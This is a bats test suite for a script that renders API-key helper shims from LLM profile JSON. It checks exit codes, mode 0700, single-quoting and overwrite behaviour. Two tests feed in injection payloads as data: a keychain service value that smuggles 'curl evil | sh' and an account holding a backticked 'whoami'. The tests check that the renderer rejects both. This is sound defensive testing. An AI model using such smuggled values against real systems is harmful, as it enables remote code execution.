#!/usr/bin/env bats
# Tests for scripts/render-apikey-helper.sh — renders helper shims for
# auth:env_var and auth:keychain profiles per §3 Cases B & C, §9
# Templates, and Amendments A1.1 / A1.3 / A1.4.

setup() {
  load 'test_helper/common'
  setup_isolated_home
  PROFILES_DIR="$HOME/.claude/llm-profiles"
  HELPERS_DIR="$PROFILES_DIR/.helpers"
  mkdir -p "$PROFILES_DIR"
}

teardown() {
  teardown_isolated_home
}

render() {
  run bash "$(cp_script render-apikey-helper.sh)" "$@"
}

write_profile() {
  local name="$1"
  local json="$2"
  local path="$PROFILES_DIR/$name.json"
  printf '%s' "$json" > "$path"
  printf '%s' "$path"
}

# ============================================================
# Argument / existence errors (exit 2, 3)
# ============================================================

@test "no arguments exits 2 (usage)" {
  run bash "$(cp_script render-apikey-helper.sh)"
  assert_failure 2
}

@test "missing profile file exits 3" {
  run bash "$(cp_script render-apikey-helper.sh)" "$PROFILES_DIR/does-not-exist.json"
  assert_failure 3
}

# ============================================================
# auth:none and auth:helper_script — nothing to render
# ============================================================

@test "auth:none profile: exits 0, no shim written" {
  path=$(write_profile "direct" '{
    "name": "direct",
    "auth": { "type": "none" }
  }')
  render "$path"
  assert_success
  [ ! -e "$HELPERS_DIR/direct.sh" ]
}

@test "auth:helper_script profile: exits 0, no shim written" {
  path=$(write_profile "gateway" '{
    "name": "gateway",
    "auth": { "type": "helper_script", "path": "~/token.sh" }
  }')
  render "$path"
  assert_success
  [ ! -e "$HELPERS_DIR/gateway.sh" ]
}

# ============================================================
# auth:env_var — shim rendering
# ============================================================

@test "auth:env_var: shim exists at .helpers/<name>.sh" {
  path=$(write_profile "vault" '{
    "name": "vault",
    "auth": { "type": "env_var", "var": "VAULT_TOKEN" }
  }')
  render "$path"
  assert_success
  [ -f "$HELPERS_DIR/vault.sh" ]
}

@test "auth:env_var: shim has mode 0700" {
  path=$(write_profile "vault" '{
    "name": "vault",
    "auth": { "type": "env_var", "var": "VAULT_TOKEN" }
  }')
  render "$path"
  assert_success
  mode=$(file_mode "$HELPERS_DIR/vault.sh")
  case "$mode" in
    *700) : ;;
    *) echo "expected mode 0700, got $mode" >&2; false ;;
  esac
}

@test "auth:env_var: shim contains the var name" {
  path=$(write_profile "vault" '{
    "name": "vault",
    "auth": { "type": "env_var", "var": "VAULT_TOKEN" }
  }')
  render "$path"
  assert_success
  grep -q "VAULT_TOKEN" "$HELPERS_DIR/vault.sh"
}

@test "auth:env_var: shim is valid shell (bash -n)" {
  path=$(write_profile "vault" '{
    "name": "vault",
    "auth": { "type": "env_var", "var": "VAULT_TOKEN" }
  }')
  render "$path"
  assert_success
  run bash -n "$HELPERS_DIR/vault.sh"
  assert_success
}

@test "auth:env_var: rendered shim returns empty + exit 1 when var unset" {
  path=$(write_profile "vault" '{
    "name": "vault",
    "auth": { "type": "env_var", "var": "VAULT_TOKEN_UNUSED" }
  }')
  render "$path"
  assert_success
  run env -i sh "$HELPERS_DIR/vault.sh"
  assert_failure 1
  # stdout is empty; diagnostic to stderr (combined here is stderr only)
  assert_output --partial "VAULT_TOKEN_UNUSED"
}

@test "auth:env_var: rendered shim returns value when var is set" {
  path=$(write_profile "vault" '{
    "name": "vault",
    "auth": { "type": "env_var", "var": "VAULT_TOKEN_SET" }
  }')
  render "$path"
  assert_success
  run env -i VAULT_TOKEN_SET="sekrit-value" sh "$HELPERS_DIR/vault.sh"
  assert_success
  assert_output "sekrit-value"
}

# ============================================================
# auth:keychain — shim rendering (macOS only)
# ============================================================

@test "auth:keychain: shim exists with mode 0700" {
  [ "$(uname)" = "Darwin" ] || skip "keychain is macOS-only"
  path=$(write_profile "mac" '{
    "name": "mac",
    "auth": { "type": "keychain", "service": "company-gateway" }
  }')
  render "$path"
  assert_success
  [ -f "$HELPERS_DIR/mac.sh" ]
  mode=$(file_mode "$HELPERS_DIR/mac.sh")
  case "$mode" in
    *700) : ;;
    *) echo "expected mode 0700, got $mode" >&2; false ;;
  esac
}

@test "auth:keychain: service name is single-quoted in shim (A1.3)" {
  [ "$(uname)" = "Darwin" ] || skip "keychain is macOS-only"
  path=$(write_profile "mac" '{
    "name": "mac",
    "auth": { "type": "keychain", "service": "company-gateway" }
  }')
  render "$path"
  assert_success
  # Ensure the service appears single-quoted, never double-quoted
  grep -q "'company-gateway'" "$HELPERS_DIR/mac.sh"
  ! grep -q '"company-gateway"' "$HELPERS_DIR/mac.sh"
}

@test "auth:keychain: shim invokes security find-generic-password" {
  [ "$(uname)" = "Darwin" ] || skip "keychain is macOS-only"
  path=$(write_profile "mac" '{
    "name": "mac",
    "auth": { "type": "keychain", "service": "company-gateway" }
  }')
  render "$path"
  assert_success
  grep -q "security find-generic-password" "$HELPERS_DIR/mac.sh"
}

@test "auth:keychain: shim is valid shell (bash -n)" {
  [ "$(uname)" = "Darwin" ] || skip "keychain is macOS-only"
  path=$(write_profile "mac" '{
    "name": "mac",
    "auth": { "type": "keychain", "service": "company-gateway", "account": "alice" }
  }')
  render "$path"
  assert_success
  run bash -n "$HELPERS_DIR/mac.sh"
  assert_success
}

@test "auth:keychain: malicious service (A1.1 regex) rejected at render-time" {
  [ "$(uname)" = "Darwin" ] || skip "keychain is macOS-only"
  # Write a profile that bypasses validation by constructing the JSON
  # directly (validate rejects this at validate-time; render MUST also
  # reject at apply-time per A1.1 defense-in-depth).
  path="$PROFILES_DIR/evil.json"
  cat > "$path" << 'EOF'
{
  "name": "evil",
  "auth": { "type": "keychain", "service": "foo'; curl evil | sh; '" }
}
EOF
  render "$path"
  assert_failure 6
  [ ! -e "$HELPERS_DIR/evil.sh" ]
}

@test "auth:keychain: malicious account (A1.1 regex) rejected at render-time" {
  [ "$(uname)" = "Darwin" ] || skip "keychain is macOS-only"
  path="$PROFILES_DIR/evil2.json"
  cat > "$path" << 'EOF'
{
  "name": "evil2",
  "auth": { "type": "keychain", "service": "ok", "account": "`whoami`" }
}
EOF
  render "$path"
  assert_failure 6
  [ ! -e "$HELPERS_DIR/evil2.sh" ]
}

# ============================================================
# Re-render semantics (§12a Write Protocol: atomic overwrite)
# ============================================================

@test "auth:env_var: re-rendering overwrites existing shim" {
  path=$(write_profile "vault" '{
    "name": "vault",
    "auth": { "type": "env_var", "var": "FIRST_VAR" }
  }')
  render "$path"
  assert_success
  grep -q "FIRST_VAR" "$HELPERS_DIR/vault.sh"

  # Update the profile and re-render
  cat > "$path" << 'EOF'
{
  "name": "vault",
  "auth": { "type": "env_var", "var": "SECOND_VAR" }
}
EOF
  render "$path"
  assert_success
  grep -q "SECOND_VAR" "$HELPERS_DIR/vault.sh"
  ! grep -q "FIRST_VAR" "$HELPERS_DIR/vault.sh"
}
